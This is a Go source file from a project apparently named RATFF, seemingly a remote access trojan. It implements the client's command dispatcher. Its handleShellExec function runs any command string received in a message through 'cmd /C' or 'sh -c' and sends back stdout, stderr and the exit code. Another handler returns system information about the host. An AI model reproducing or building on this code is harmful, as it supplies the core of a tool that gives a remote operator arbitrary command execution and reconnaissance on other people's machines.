package main

import (
	"bytes"
	"os"
	"os/exec"
	"runtime"

	"RATFF/shared"
)

// executeCommand routes incoming commands to their handlers.
func executeCommand(msg shared.Message) shared.Message {
	log.WithField("command", msg.Command).Info("Executing command")

	switch msg.Command {
	case shared.CmdShellExec:
		return handleShellExec(msg)
	case shared.CmdSystemInfo:
		return handleSystemInfo(msg)
	case shared.CmdExit:
		log.Info("Received exit command, shutting down")
		os.Exit(0)
		return shared.Message{}
	default:
		return shared.NewMessage(shared.MsgError, "", msg.ClientID,
			map[string]interface{}{"error": "unknown command"})
	}
}

// handleShellExec executes a shell command and returns stdout, stderr, and exit code.
func handleShellExec(msg shared.Message) shared.Message {
	cmdStr, _ := msg.Payload["cmd"].(string)
	if cmdStr == "" {
		return shared.NewMessage(shared.MsgError, "", msg.ClientID,
			map[string]interface{}{"error": "empty command"})
	}

	var cmd *exec.Cmd
	if runtime.GOOS == "windows" {
		cmd = exec.Command("cmd", "/C", cmdStr)
	} else {
		cmd = exec.Command("sh", "-c", cmdStr)
	}

	var stdout, stderr bytes.Buffer
	cmd.Stdout = &stdout
	cmd.Stderr = &stderr

	err := cmd.Run()

	exitCode := 0
	if err != nil {
		if exitErr, ok := err.(*exec.ExitError); ok {
			exitCode = exitErr.ExitCode()
		} else {
			exitCode = 1
		}
	}

	result := map[string]interface{}{
		"command":   cmdStr,
		"stdout":    stdout.String(),
		"stderr":    stderr.String(),
		"exit_code": exitCode,
	}

	return shared.NewMessage(shared.MsgResponse, "", msg.ClientID, result)
}

// handleSystemInfo returns system information for the client.
func handleSystemInfo(msg shared.Message) shared.Message {
	info := shared.BuildClientInfo(msg.ClientID)
	return shared.NewMessage(shared.MsgResponse, "", msg.ClientID, info.ToPayload())
}
